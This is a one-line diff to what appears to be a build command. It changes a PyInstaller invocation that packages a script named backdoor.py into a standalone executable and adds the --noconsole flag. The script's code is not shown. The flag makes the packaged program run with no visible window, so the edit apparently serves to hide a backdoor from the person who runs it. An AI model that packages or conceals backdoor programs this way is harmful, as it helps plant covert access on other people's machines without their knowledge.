@@ -1,1 +1,1 @@
-pyinstaller --onefile backdoor.py 
+pyinstaller --onefile --noconsole backdoor.py
